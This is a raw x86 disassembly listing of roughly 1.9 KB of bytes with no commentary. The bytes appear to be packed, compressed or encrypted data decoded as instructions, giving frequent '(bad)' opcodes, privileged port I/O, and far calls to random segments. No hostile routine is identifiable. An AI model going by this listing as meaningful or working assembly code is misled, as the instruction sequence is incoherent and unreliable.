  40d4de:	aam    0xc2
  40d4e0:	fstp   TBYTE PTR ds:0xd7f1b964
  40d4e6:	dec    ebx
  40d4e7:	fidivr WORD PTR [ebp+0x25]
  40d4ea:	pop    es
  40d4eb:	sub    edx,esp
  40d4ed:	pop    ss
  40d4ee:	and    DWORD PTR [edi+esi*2+0x291a67f2],ebp
  40d4f5:	enter  0xd5c5,0x9d
  40d4f9:	ficomp WORD PTR [edx-0x4c]
  40d4fc:	inc    esp
  40d4fd:	lahf   
  40d4fe:	cmp    eax,0x8506c998
  40d503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d504:	push   cx
  40d506:	in     al,dx
  40d507:	std    
  40d508:	in     al,dx
  40d509:	inc    esi
  40d50a:	ss retf 0x9b28
  40d50e:	mov    cl,0xe4
  40d510:	jno    0x40d556
  40d512:	dec    edi
  40d513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d514:	fistp  WORD PTR [esi-0x1952832]
  40d51a:	and    cl,BYTE PTR [ecx+0x43]
  40d51d:	ficom  DWORD PTR [eax+0x48]
  40d520:	(bad)  
  40d521:	aam    0xc0
  40d523:	jge    0x40d58b
  40d525:	loopne 0x40d579
  40d527:	leave  
  40d528:	int3   
  40d529:	fsub   QWORD PTR [eax]
  40d52b:	out    dx,eax
  40d52c:	ret    
  40d52d:	cmp    DWORD PTR [ebx],0x2
  40d530:	lods   al,BYTE PTR ds:[esi]
  40d531:	int    0xd0
  40d533:	sbb    BYTE PTR [ecx],ah
  40d535:	call   0x3963:0xc1bd25f3
  40d53c:	jp     0x40d568
  40d53e:	add    eax,0xf1868ff0
  40d543:	mov    esi,0xc81bda6f
  40d548:	dec    ecx
  40d549:	dec    ecx
  40d54a:	sub    ecx,edx
  40d54c:	sti    
  40d54d:	pop    ebx
  40d54e:	mov    al,0x16
  40d550:	ds mov bl,0x6f
  40d553:	dec    eax
  40d554:	shl    DWORD PTR [edx],0xe0
  40d557:	jle    0x40d594
  40d559:	sbb    eax,0xc5280000
  40d55e:	jg     0x40d502
  40d560:	popa   
  40d561:	imul   ebp,DWORD PTR [ebx],0xffffffe3
  40d564:	sbb    eax,DWORD PTR [edi+0xcc7768d]
  40d56a:	cmc    
  40d56b:	lock lods al,BYTE PTR ds:[esi]
  40d56d:	call   0xcb26:0xbd8afe95
  40d574:	push   esi
  40d575:	aaa    
  40d576:	push   ebp
  40d577:	shl    esi,1
  40d579:	into   
  40d57a:	mov    edi,0x728a73dd
  40d57f:	pop    ds
  40d580:	pusha  
  40d581:	stc    
  40d582:	xor    al,0x19
  40d584:	xchg   DWORD PTR [ecx-0x6642b57a],esi
  40d58a:	xchg   edi,eax
  40d58b:	xor    al,0x34
  40d58d:	aam    0xe9
  40d58f:	inc    edi
  40d590:	popa   
  40d591:	lea    eax,[esi]
  40d593:	das    
  40d594:	and    eax,0xcb9bb83f
  40d599:	lahf   
  40d59a:	and    ebp,DWORD PTR [ecx-0x7c6db6c0]
  40d5a0:	iret   
  40d5a1:	xchg   BYTE PTR [edx-0x4925900d],ah
  40d5a7:	out    0x87,eax
  40d5a9:	mov    ah,0x3
  40d5ab:	inc    ebp
  40d5ac:	popa   
  40d5ad:	add    edx,edx
  40d5af:	or     DWORD PTR [edi],ebx
  40d5b1:	or     dl,BYTE PTR [edi+0x43]
  40d5b4:	and    al,0xa4
  40d5b6:	jbe    0x40d546
  40d5b8:	pushf  
  40d5b9:	mov    DWORD PTR [esi],ebp
  40d5bb:	popa   
  40d5bc:	pop    eax
  40d5bd:	jb     0x40d583
  40d5bf:	mov    ds:0xf27bf0f2,eax
  40d5c4:	xchg   esp,eax
  40d5c5:	xchg   esp,eax
  40d5c6:	push   es
  40d5c7:	cld    
  40d5c8:	push   0xfab59b51
  40d5cd:	inc    ebx
  40d5ce:	js     0x40d57b
  40d5d0:	inc    esi
  40d5d1:	pop    ss
  40d5d2:	std    
  40d5d3:	adc    DWORD PTR [ebp+0x239b0c0],0x57b4175a
  40d5dd:	sub    DWORD PTR [ebp-0x4bbc3861],eax
  40d5e3:	inc    esi
  40d5e4:	and    cl,BYTE PTR [edx]
  40d5e6:	addr16 jne 0x40d659
  40d5e9:	sbb    eax,DWORD PTR [ecx]
  40d5eb:	xor    DWORD PTR [ebx+0x10],esp
  40d5ee:	dec    edx
  40d5ef:	jmp    0xbeed42af
  40d5f4:	fnstenv [edi+0x531ba06]
  40d5fa:	xor    DWORD PTR [edi-0x7b],esp
  40d5fd:	mov    WORD PTR [esi],fs
  40d5ff:	mov    ebx,DWORD PTR [ecx-0x2b859154]
  40d605:	test   al,0x5c
  40d607:	xor    dl,BYTE PTR [ecx-0x5e]
  40d60a:	fld    QWORD PTR [edi]
  40d60c:	cmp    DWORD PTR [eax+esi*8],ecx
  40d60f:	inc    ebp
  40d610:	out    dx,al
  40d611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d612:	scas   al,BYTE PTR es:[edi]
  40d613:	fimul  WORD PTR [eax]
  40d615:	sbb    BYTE PTR [esi+0x5e8d87e3],ah
  40d61b:	inc    edx
  40d61c:	xchg   esi,eax
  40d61d:	jg     0x40d64d
  40d61f:	loopne 0x40d60b
  40d621:	jns    0x40d60e
  40d623:	push   ebp
  40d624:	ret    
  40d625:	scas   al,BYTE PTR es:[edi]
  40d626:	xchg   esi,eax
  40d627:	ds xchg esi,eax
  40d629:	mov    ch,0x6b
  40d62b:	repz sub eax,DWORD PTR [ebx-0x3a]
  40d62f:	sub    eax,0x862f7ce7
  40d634:	push   0xffffff96
  40d636:	or     esp,DWORD PTR [edi-0x4fbf7d41]
  40d63c:	jecxz  0x40d627
  40d63e:	(bad)  
  40d63f:	fdivr  st,st(0)
  40d641:	jne    0x40d634
  40d643:	dec    esp
  40d644:	mov    eax,ds:0x7ea2b2eb
  40d649:	sub    BYTE PTR [ecx],0xd3
  40d64c:	sub    esi,DWORD PTR ds:0xc5c4a8f2
  40d652:	and    eax,0x4f27dc7e
  40d657:	bound  edi,QWORD PTR [edx+0x73]
  40d65a:	jae    0x40d691
  40d65c:	xor    eax,DWORD PTR [esi-0x11840266]
  40d662:	dec    ebx
  40d663:	push   ebp
  40d664:	arpl   WORD PTR [ebx],ax
  40d666:	sub    bh,al
  40d668:	dec    edx
  40d669:	cmp    al,BYTE PTR [ecx]
  40d66b:	add    al,0x7
  40d66d:	dec    ebp
  40d66e:	test   al,0xd6
  40d670:	scas   eax,DWORD PTR es:[edi]
  40d671:	pushf  
  40d672:	lds    esp,FWORD PTR [edx-0x1b6b42ed]
  40d678:	lods   eax,DWORD PTR ds:[esi]
  40d679:	xor    al,0x79
  40d67b:	mov    bl,0x86
  40d67d:	arpl   WORD PTR [ebp+0xd79a84f],bx
  40d683:	jae    0x40d6e6
  40d685:	xor    al,0x1d
  40d687:	mov    esi,ecx
  40d689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d68a:	aam    0x89
  40d68c:	jl     0x40d61f
  40d68e:	cmp    eax,ebx
  40d690:	loope  0x40d681
  40d692:	and    al,0xb1
  40d694:	xor    dl,BYTE PTR [eax-0x38edcef8]
  40d69a:	jmp    0x40d6f9
  40d69c:	jno    0x40d6b0
  40d69e:	dec    ebp
  40d69f:	mov    bl,ch
  40d6a1:	inc    ecx
  40d6a2:	cmp    esi,DWORD PTR [edi]
  40d6a4:	adc    eax,0x1ff5b0cc
  40d6a9:	out    0xfe,al
  40d6ab:	cmc    
  40d6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6ad:	mov    ah,BYTE PTR [edx+ebp*8]
  40d6b0:	sbb    BYTE PTR [ebp+0xe],0x1a
  40d6b4:	rol    DWORD PTR [ebx+0x12a98e08],cl
  40d6ba:	push   ecx
  40d6bb:	gs xchg edi,eax
  40d6bd:	mov    dh,0x67
  40d6bf:	or     ah,BYTE PTR [esi+0x30d9ccb4]
  40d6c5:	xor    al,0x48
  40d6c7:	fnstcw WORD PTR [edx+eiz*8+0x7f]
  40d6cb:	jl     0x40d680
  40d6cd:	and    DWORD PTR [ebp-0x4d27a0d9],ecx
  40d6d3:	fnstenv [eax]
  40d6d5:	inc    ebx
  40d6d6:	push   ecx
  40d6d7:	frstor [edx-0x40]
  40d6da:	outs   dx,DWORD PTR ds:[esi]
  40d6db:	aaa    
  40d6dc:	jecxz  0x40d704
  40d6de:	bound  ebx,QWORD PTR [edi+0x1dea8d11]
  40d6e4:	adc    al,0x23
  40d6e6:	mov    WORD PTR [edi+0x64cbd7ff],?
  40d6ec:	xor    BYTE PTR [esi+0x2f2cc159],0x13
  40d6f3:	icebp  
  40d6f4:	sub    ebx,DWORD PTR [ecx+0x7e7a90de]
  40d6fa:	push   es
  40d6fb:	test   BYTE PTR [ebx+0x5c],bl
  40d6fe:	mov    edx,0x1d3342ea
  40d703:	cmp    ah,bl
  40d705:	inc    ebx
  40d706:	push   esi
  40d707:	xchg   edx,eax
  40d708:	out    0xc4,eax
  40d70a:	pop    edi
  40d70b:	mul    BYTE PTR [edx]
  40d70d:	push   ebp
  40d70e:	mov    ebp,0xdccd77ad
  40d713:	sub    dl,BYTE PTR [ebx]
  40d715:	enter  0x55ca,0xc3
  40d719:	pop    esp
  40d71a:	daa    
  40d71b:	ffree  st(3)
  40d71d:	cdq    
  40d71e:	or     ah,BYTE PTR [ecx+edi*4-0x79]
  40d722:	cmp    BYTE PTR ds:0x1e7a3473,dl
  40d728:	in     eax,dx
  40d729:	push   ebp
  40d72a:	mov    ds:0xb6ec3e08,eax
  40d72f:	mov    eax,ds:0xfb297fa3
  40d734:	sbb    BYTE PTR [ecx-0x70],dl
  40d737:	fs jo  0x40d796
  40d73a:	pop    ebp
  40d73b:	fisttp DWORD PTR [esi]
  40d73d:	loope  0x40d71d
  40d73f:	outs   dx,BYTE PTR ds:[esi]
  40d740:	cld    
  40d741:	ret    
  40d742:	stos   DWORD PTR es:[edi],eax
  40d743:	jmp    0x57163d60
  40d748:	mov    BYTE PTR [esi],bl
  40d74a:	loope  0x40d725
  40d74c:	stos   BYTE PTR es:[edi],al
  40d74d:	xchg   ecx,eax
  40d74e:	xor    al,BYTE PTR [esi+0x4d]
  40d751:	pop    ebp
  40d752:	inc    eax
  40d753:	outs   dx,BYTE PTR ds:[esi]
  40d754:	test   BYTE PTR [edx+0x3b],ah
  40d757:	mov    WORD PTR [edi+0x39585689],fs
  40d75d:	push   ss
  40d75e:	xor    DWORD PTR [edx+0x35740eb4],0x18
  40d765:	mov    esi,0xab88cf6d
  40d76a:	gs call 0x91b7:0xd05345a0
  40d772:	fild   DWORD PTR [ebx+0x1c]
  40d775:	lods   eax,DWORD PTR ds:[esi]
  40d776:	xchg   edx,eax
  40d777:	xchg   edi,eax
  40d778:	repnz adc ah,BYTE PTR [ecx+0x9]
  40d77c:	(bad)  
  40d77d:	out    0x6f,eax
  40d77f:	(bad)  
  40d780:	fmul   DWORD PTR [ecx+0x3de5da27]
  40d786:	xchg   esp,eax
  40d787:	xor    bh,al
  40d789:	mov    DWORD PTR [ecx+0x96e6055],esi
  40d78f:	cwde   
  40d790:	stc    
  40d791:	sar    DWORD PTR [esi+esi*1-0x5e1214cd],1
  40d798:	fadd   QWORD PTR [edi-0xc]
  40d79b:	fcmovbe st,st(4)
  40d79d:	out    dx,eax
  40d79e:	add    eax,0xeb658f22
  40d7a3:	adc    eax,0xbe221ebe
  40d7a8:	call   0x367:0x1cd91f2d
  40d7af:	loop   0x40d78d
  40d7b1:	dec    ebp
  40d7b2:	sbb    ebp,DWORD PTR [ecx+eax*2]
  40d7b5:	push   esp
  40d7b6:	sbb    DWORD PTR [edi-0xa5187c6],ecx
  40d7bc:	mov    esi,0xdd0e3863
  40d7c1:	jno    0x40d7db
  40d7c3:	xor    dl,BYTE PTR [ebp+0x1c]
  40d7c6:	inc    ecx
  40d7c7:	imul   esi,eax,0x297b61a8
  40d7cd:	shl    ecx,cl
  40d7cf:	loop   0x40d795
  40d7d1:	mov    edi,0x2a83d729
  40d7d6:	rcl    DWORD PTR [ebx+0x89a998f],1
  40d7dc:	lock sti 
  40d7de:	jb     0x40d805
  40d7e0:	fsub   QWORD PTR [ebp-0x67]
  40d7e3:	rcr    DWORD PTR [edx],cl
  40d7e5:	into   
  40d7e6:	mov    dl,0xee
  40d7e8:	out    0x8,eax
  40d7ea:	aas    
  40d7eb:	out    0xc8,eax
  40d7ed:	add    al,BYTE PTR [edi+edx*4]
  40d7f0:	mov    esi,0xa566047d
  40d7f5:	shl    DWORD PTR [esi],cl
  40d7f7:	push   0xb1d38f39
  40d7fc:	popa   
  40d7fd:	or     DWORD PTR [edi-0x24],edx
  40d800:	inc    ecx
  40d801:	mov    ch,0x41
  40d803:	hlt    
  40d804:	add    eax,0x8640b523
  40d809:	mov    DWORD PTR [eax],ebx
  40d80b:	mov    bh,0x2b
  40d80d:	jp     0x40d7d3
  40d80f:	(bad)  
  40d810:	fbstp  TBYTE PTR ds:0x3020a901
  40d816:	jecxz  0x40d849
  40d818:	fimul  DWORD PTR fs:[ebx-0x1d9e6ac0]
  40d81f:	inc    edx
  40d820:	fcom   DWORD PTR [eax-0x80]
  40d823:	mov    edi,0xd145be6e
  40d828:	repz mov ebx,0x15f4b5aa
  40d82e:	iret   
  40d82f:	out    dx,eax
  40d830:	call   0xe2a8060a
  40d835:	cs inc ecx
  40d837:	(bad)  
  40d838:	pop    ds
  40d839:	stc    
  40d83a:	sbb    ah,bl
  40d83c:	mov    edi,0xd63dc10e
  40d841:	sub    ch,BYTE PTR [eax-0x79]
  40d844:	add    al,0x9e
  40d846:	push   0xc418cd
  40d84b:	push   ebp
  40d84c:	imul   esp,DWORD PTR [edx],0x56dbb0e2
  40d852:	fbstp  TBYTE PTR [esi+0x1a]
  40d855:	outs   dx,DWORD PTR ds:[esi]
  40d856:	add    esi,DWORD PTR ds:0xfc2ab0f3
  40d85c:	mov    al,ds:0x37d64b16
  40d861:	pusha  
  40d862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d863:	fld    TBYTE PTR [esi*4+0x77b76780]
  40d86a:	mov    ecx,0x3c11ce70
  40d86f:	push   0xffffffd7
  40d871:	cmc    
  40d872:	iret   
  40d873:	mov    al,ds:0x3cb9ef7d
  40d878:	xchg   ebx,eax
  40d879:	add    BYTE PTR [ebp+0x7d44a973],0xe4
  40d880:	fwait
  40d881:	jo     0x40d8b8
  40d883:	jno    0x40d8ee
  40d885:	sub    eax,DWORD PTR [eax-0x49]
  40d888:	mov    dl,0xc1
  40d88a:	mov    al,ds:0x772cba99
  40d88f:	add    esp,DWORD PTR [eax-0x420c2239]
  40d895:	ja     0x40d8e3
  40d897:	inc    esi
  40d898:	cmp    eax,0xec219af3
  40d89d:	shl    edx,0x26
  40d8a0:	push   ss
  40d8a1:	cmc    
  40d8a2:	cmp    BYTE PTR [ebx-0x5a],bl
  40d8a5:	add    ebp,DWORD PTR [esi]
  40d8a7:	dec    edi
  40d8a8:	cld    
  40d8a9:	das    
  40d8aa:	cmp    edx,DWORD PTR [ebp+0x68]
  40d8ad:	adc    DWORD PTR [ecx],esp
  40d8af:	test   ch,al
  40d8b1:	out    dx,eax
  40d8b2:	div    DWORD PTR [esi+0x1f1799a3]
  40d8b8:	jb     0x40d8c9
  40d8ba:	ss dec ecx
  40d8bc:	leave  
  40d8bd:	push   ebx
  40d8be:	xchg   ecx,eax
  40d8bf:	ror    DWORD PTR [edi+0x49],1
  40d8c2:	lea    esp,[eax]
  40d8c4:	aad    0x36
  40d8c6:	jecxz  0x40d8bd
  40d8c8:	push   0x59
  40d8ca:	test   al,0x94
  40d8cc:	jg     0x40d88c
  40d8ce:	xchg   ebx,eax
  40d8cf:	cmc    
  40d8d0:	div    BYTE PTR [ebp-0x6a]
  40d8d3:	aaa    
  40d8d4:	icebp  
  40d8d5:	call   0xb4a7:0x61f69ae5
  40d8dc:	sbb    eax,0x325c7216
  40d8e1:	test   al,0x10
  40d8e3:	xor    dh,0x58
  40d8e6:	scas   al,BYTE PTR es:[edi]
  40d8e7:	dec    esi
  40d8e8:	mov    DWORD PTR [eax+0x5031496],ecx
  40d8ee:	aad    0x17
  40d8f0:	and    esi,DWORD PTR [ecx+0x12]
  40d8f3:	ror    cl,cl
  40d8f5:	adc    al,0xa9
  40d8f7:	ss daa 
  40d8f9:	shr    DWORD PTR [ebp+0x5c12cdd2],0x4b
  40d900:	fwait
  40d901:	xchg   esi,eax
  40d902:	out    dx,eax
  40d903:	cli    
  40d904:	mov    bh,0xb1
  40d906:	sahf   
  40d907:	jae    0x40d921
  40d909:	iret   
  40d90a:	xchg   ebp,esp
  40d90c:	pop    edx
  40d90d:	fimul  DWORD PTR [edi+edx*8+0x3a]
  40d911:	add    ebp,DWORD PTR [ecx+0x228ff63c]
  40d917:	in     al,0x51
  40d919:	dec    ebp
  40d91a:	cmp    DWORD PTR [ecx],edx
  40d91c:	mov    ecx,0x5b59e288
  40d921:	push   ecx
  40d922:	aaa    
  40d923:	jbe    0x40d955
  40d925:	push   eax
  40d926:	shr    bh,cl
  40d928:	inc    esp
  40d929:	(bad)  
  40d92a:	aaa    
  40d92b:	sbb    esp,eax
  40d92d:	mov    ds:0x8f2b4e3,al
  40d932:	inc    ebx
  40d933:	int    0x2a
  40d935:	in     eax,dx
  40d936:	mov    cl,0xc8
  40d938:	mul    BYTE PTR [edi]
  40d93a:	mov    esi,0x251079ee
  40d93f:	pop    ss
  40d940:	fdiv   st,st(2)
  40d942:	es fwait
  40d944:	and    al,0x49
  40d946:	nop
  40d947:	(bad)  
  40d948:	push   ebp
  40d949:	shr    DWORD PTR [esi],cl
  40d94b:	std    
  40d94c:	addr16 mov bh,cl
  40d94f:	and    eax,0x15cc86ae
  40d954:	leave  
  40d955:	sar    DWORD PTR [esi],1
  40d957:	daa    
  40d958:	not    esi
  40d95a:	daa    
  40d95b:	sbb    DWORD PTR [ebx+0x78d30830],ebp
  40d961:	cmp    al,0x6e
  40d963:	adc    esp,esi
  40d965:	xor    al,0x7e
  40d967:	in     eax,dx
  40d968:	imul   esi,ecx,0xc4302b2a
  40d96e:	in     al,0x15
  40d970:	add    eax,0x20eced93
  40d975:	xor    eax,0xc090ff95
  40d97a:	inc    edi
  40d97b:	cmp    BYTE PTR [eax+0x54],bl
  40d97e:	rcr    BYTE PTR [ebx+0x430b2bf1],cl
  40d984:	setns  dl
  40d987:	inc    ecx
  40d988:	add    DWORD PTR [ebx+0x2cfe9596],eax
  40d98e:	mov    BYTE PTR ds:0x23e6ab3b,ah
  40d994:	cwde   
  40d995:	pop    ecx
  40d996:	or     ch,bh
  40d998:	outs   dx,BYTE PTR ds:[esi]
  40d999:	rcl    DWORD PTR [eax+0x4a],0x26
  40d99d:	fwait
  40d99e:	mov    bh,0x66
  40d9a0:	cmc    
  40d9a1:	push   ds
  40d9a2:	add    edx,DWORD PTR ds:0x6769103d
  40d9a8:	mov    WORD PTR [esi-0x303bf5c4],gs
  40d9ae:	stos   DWORD PTR es:[edi],eax
  40d9af:	aaa    
  40d9b0:	iret   
  40d9b1:	mov    eax,0xb106fa8
  40d9b6:	push   esp
  40d9b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9b8:	cmp    BYTE PTR [esi-0x24],ch
  40d9bb:	jbe    0x40d9c4
  40d9bd:	pshufw mm5,QWORD PTR [esi+eiz*2+0xf],0x28
  40d9c3:	jmp    0xa884:0xd2d3a939
  40d9ca:	js     0x40d965
  40d9cc:	mov    bl,0xff
  40d9ce:	inc    eax
  40d9cf:	in     eax,dx
  40d9d0:	rol    BYTE PTR [edi+0x6415d812],cl
  40d9d6:	lock lods eax,DWORD PTR ds:[esi]
  40d9d8:	out    dx,al
  40d9d9:	call   0xc607:0xa622c00f
  40d9e0:	(bad)  [eax]
  40d9e2:	mov    dl,0x9f
  40d9e4:	stos   DWORD PTR es:[edi],eax
  40d9e5:	push   es
  40d9e6:	push   es
  40d9e7:	mov    al,ds:0xb483a1dd
  40d9ec:	pusha  
  40d9ed:	aas    
  40d9ee:	leave  
  40d9ef:	ds retf 0x49d9
  40d9f3:	or     esp,ebx
  40d9f5:	fimul  WORD PTR [ecx+0x1bb1319a]
  40d9fb:	lods   eax,DWORD PTR ds:[esi]
  40d9fc:	dec    ecx
  40d9fd:	inc    ecx
  40d9fe:	fucomi st,st(2)
  40da00:	rcl    BYTE PTR [ecx-0x5519c871],1
  40da06:	cmp    al,0xbd
  40da08:	mov    bl,BYTE PTR [ebx-0x435a82eb]
  40da0e:	xlat   BYTE PTR ds:[ebx]
  40da0f:	and    edx,edx
  40da11:	(bad)  
  40da12:	arpl   WORD PTR [ebx],sp
  40da14:	retf   
  40da15:	das    
  40da16:	ja     0x40da82
  40da18:	mov    cs,WORD PTR [esi-0x73]
  40da1b:	jno    0x40d9fa
  40da1d:	popf   
  40da1e:	mov    ah,BYTE PTR [esp+ebp*8]
  40da21:	adc    BYTE PTR [ecx-0x28da845c],dl
  40da27:	inc    esi
  40da28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da29:	in     eax,dx
  40da2a:	sub    BYTE PTR [ebp-0x33616836],dh
  40da30:	xor    DWORD PTR [ecx-0x21],esp
  40da33:	scas   al,BYTE PTR es:[edi]
  40da34:	je     0x40da2c
  40da36:	or     edi,DWORD PTR [eax+ebp*2]
  40da39:	add    al,0xf3
  40da3b:	adc    DWORD PTR ds:0x61e41ffb,edx
  40da41:	push   esp
  40da42:	mov    al,ds:0x5573aae1
  40da47:	shr    BYTE PTR [edx-0x7],1
  40da4a:	ja     0x40da6d
  40da4c:	sbb    edx,DWORD PTR cs:[eax+edi*4]
  40da50:	inc    ebx
  40da51:	xor    al,0x72
  40da53:	icebp  
  40da54:	xor    DWORD PTR ds:0xc7d9a3e2,ebx
  40da5a:	in     eax,0x45
  40da5c:	xchg   DWORD PTR ds:0xa1d9b7da,ebx
  40da62:	ficom  DWORD PTR [edi+0x71]
  40da65:	sbb    eax,0xc7d9a3ee
  40da6a:	or     DWORD PTR [ecx-0x79],ebp
  40da6d:	sbb    eax,0xb5d9b7f6
  40da72:	fidivr DWORD PTR [ebx+0x71]
  40da75:	sbb    eax,0xbdd9a2fe
  40da7a:	fisttp WORD PTR [ebp-0x527de276]
  40da80:	(bad)  
  40da81:	pop    edi
  40da82:	push   edx
  40da83:	push   ebp
  40da84:	sub    BYTE PTR [edi-0x23],dl
  40da87:	adc    ebx,DWORD PTR [eax-0x1d]
  40da8a:	std    
  40da8b:	loope  0x40da81
  40da8d:	dec    esp
  40da8e:	jp     0x40daf1
  40da90:	xor    eax,DWORD PTR [ecx]
  40da92:	fimul  DWORD PTR [edx+0x28]
  40da95:	jnp    0x40dad9
  40da97:	xor    al,0x4a
  40da99:	jne    0x40daf0
  40da9b:	rcr    BYTE PTR [edi-0x14],1
  40da9e:	fcomp  DWORD PTR [ebx-0x4d]
  40daa1:	cmc    
  40daa2:	mov    bl,0xdb
  40daa4:	inc    ebp
  40daa5:	call   0xcca4:0xa08d1ad2
  40daac:	jecxz  0x40db02
  40daae:	add    eax,0x11fa7add
  40dab3:	mov    edi,0xbcbc3e22
  40dab8:	stos   BYTE PTR es:[edi],al
  40dab9:	in     eax,0x14
  40dabb:	test   BYTE PTR [ebx+edi*1-0x6f],ah
  40dabf:	out    dx,al
  40dac0:	mov    WORD PTR [ecx],cx
  40dac3:	sbb    DWORD PTR [eax-0x962595e],esi
  40dac9:	push   edi
  40daca:	call   0xb9e:0x350b56c0
  40dad1:	in     eax,dx
  40dad2:	sbb    al,0x8e
  40dad4:	scas   al,BYTE PTR es:[edi]
  40dad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dad6:	bound  edx,QWORD PTR [edx+0x3bbe477b]
  40dadc:	mov    ebx,0x6fcbf567
  40dae1:	xchg   DWORD PTR [ecx+ebx*1],edx
  40dae4:	popf   
  40dae5:	repz data16 cs std 
  40dae9:	push   0x68
  40daeb:	mov    dl,0x2
  40daed:	xchg   ebp,eax
  40daee:	and    DWORD PTR [esi+0x335c8f71],0xffffffc8
  40daf5:	add    eax,esi
  40daf7:	not    BYTE PTR [edx]
  40daf9:	sbb    BYTE PTR [edi+0x222c68d0],al
  40daff:	jbe    0x40daaa
  40db01:	pop    eax
  40db02:	and    BYTE PTR [esi+esi*1],ch
  40db05:	rcl    al,0x42
  40db08:	enter  0xa117,0x2f
  40db0c:	aas    
  40db0d:	repnz (bad) 
  40db0f:	inc    al
  40db11:	push   edi
  40db12:	fist   WORD PTR [ebp+0x56]
  40db15:	jne    0x40db4c
  40db17:	cmp    ebx,DWORD PTR [esi-0x23]
  40db1a:	cmp    ecx,DWORD PTR [edx]
  40db1c:	xor    DWORD PTR [ebp+0x3e],edi
  40db1f:	pop    edx
  40db20:	cmp    cl,BYTE PTR [esi]
  40db22:	adc    al,0x19
  40db24:	loopne 0x40db17
  40db26:	add    eax,0xd18a79d8
  40db2b:	js     0x40dba9
  40db2d:	dec    esp
  40db2e:	add    ebp,DWORD PTR [eax]
  40db30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db31:	cli    
  40db32:	test   al,0xc7
  40db34:	js     0x40db11
  40db36:	jae    0x40db89
  40db38:	inc    edx
  40db39:	arpl   WORD PTR [ecx+ebp*4-0x509fcc35],di
  40db40:	xor    dl,BYTE PTR [edi-0x2f451ed1]
  40db46:	fcmovu st,st(3)
  40db48:	std    
  40db49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db4a:	sub    ebp,ebp
  40db4c:	or     edi,eax
  40db4e:	leave  
  40db4f:	test   eax,0xe96c014d
  40db54:	cmp    al,0xd8
  40db56:	icebp  
  40db57:	outs   dx,BYTE PTR ds:[esi]
  40db58:	cmp    BYTE PTR [esp-0xa381903],0xed
  40db60:	repz stc 
  40db62:	in     al,0x94
  40db64:	arpl   WORD PTR [eax],dx
  40db66:	ins    DWORD PTR es:[edi],dx
  40db67:	stos   BYTE PTR es:[edi],al
  40db68:	mov    BYTE PTR [edi+0x1],ch
  40db6b:	(bad)  
  40db6c:	(bad)  
  40db6e:	repnz mov ebp,ss
  40db71:	mov    esi,0xc3e5746e
  40db76:	loopne 0x40db2d
  40db78:	repnz xchg esi,eax
  40db7a:	fucomip st,st(7)
  40db7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db7d:	das    
  40db7e:	pop    es
  40db7f:	xchg   esi,eax
  40db80:	loop   0x40db18
  40db82:	and    bl,BYTE PTR ds:0xa5db510c
  40db88:	clc    
  40db89:	test   edi,0xae76d312
  40db8f:	mov    ecx,ss
  40db91:	fmul   QWORD PTR [ebp-0x6a]
  40db94:	add    ebp,esi
  40db96:	sbb    eax,0x9081a534
  40db9b:	leave  
  40db9c:	jnp    0x40dba4
  40db9e:	sub    dh,BYTE PTR [edi-0x4c]
  40dba1:	jb     0x40db56
  40dba3:	in     eax,0xa8
  40dba5:	retf   
  40dba6:	xchg   ebp,eax
  40dba7:	addr16 loopne 0x40dbfb
  40dbaa:	and    DWORD PTR [ebx-0x423076a8],ecx
  40dbb0:	cld    
  40dbb1:	dec    edi
  40dbb2:	push   cs
  40dbb3:	fs jnp 0x40dbdb
  40dbb6:	js     0x40db6e
  40dbb8:	push   0x3f
  40dbba:	ins    BYTE PTR es:[edi],dx
  40dbbb:	jecxz  0x40dbfa
  40dbbd:	jecxz  0x40dbeb
  40dbbf:	xor    ebx,edi
  40dbc1:	adc    eax,0x978badd9
  40dbc6:	out    0xa2,eax
  40dbc8:	leave  
  40dbc9:	(bad)  [eax+ecx*8-0x29]
  40dbcd:	sub    cl,BYTE PTR [esi-0x4a]
  40dbd0:	mov    gs,edi
  40dbd2:	sub    ebp,ebp
  40dbd4:	leave  
  40dbd5:	jbe    0x40dc2c
  40dbd7:	into   
  40dbd8:	fidivr DWORD PTR [esi-0x39643e0e]
  40dbde:	xchg   DWORD PTR [ecx-0x943aa42],esp
  40dbe4:	dec    edi
  40dbe5:	pop    es
  40dbe6:	and    edx,DWORD PTR [edi+0x71]
  40dbe9:	dec    edx
  40dbea:	stos   DWORD PTR es:[edi],eax
  40dbeb:	out    0xeb,eax
  40dbed:	inc    edx
  40dbee:	shl    DWORD PTR [edx+0x3266277b],1
  40dbf4:	pop    ecx
  40dbf5:	(bad)  
  40dbf6:	xor    bh,BYTE PTR [eax]
  40dbf8:	inc    ecx
  40dbf9:	mov    DWORD PTR [esi],esi
  40dbfb:	loope  0x40dc48
  40dbfd:	retf   
  40dbfe:	mov    cl,BYTE PTR [edi+0x1a0705ee]
  40dc04:	outs   dx,BYTE PTR ds:[esi]
  40dc05:	cwde   
  40dc06:	(bad)  
  40dc07:	imul   ebp,DWORD PTR [edi+0x30dff25d],0xffffffdf
  40dc0e:	jge    0x40db98
  40dc10:	xchg   ebp,eax
  40dc11:	call   0x2ae8:0xed37fdd0
  40dc18:	test   DWORD PTR [ecx-0x1d08328a],esi
  40dc1e:	hlt    
  40dc1f:	out    dx,al
  40dc20:	test   BYTE PTR [esi+0x18],0x28
  40dc24:	or     DWORD PTR [esi-0x39],esp
  40dc27:	enter  0xca7f,0xab
  40dc2b:	popa   
  40dc2c:	mov    ds:0xeb090751,al
  40dc31:	xchg   ecx,eax
  40dc32:	inc    esi
  40dc33:	dec    edi
  40dc35:	push   ss
  40dc36:	pop    ebx
  40dc37:	xor    bl,BYTE PTR [esi+0x5f690338]
  40dc3d:	inc    eax
  40dc3e:	stos   DWORD PTR es:[edi],eax
  40dc3f:	push   edi
  40dc40:	div    ecx
  40dc42:	mov    ds:0xeeefa6d4,al
  40dc47:	push   cs
  40dc48:	push   esi
  40dc49:	mov    ds:0x70685549,al
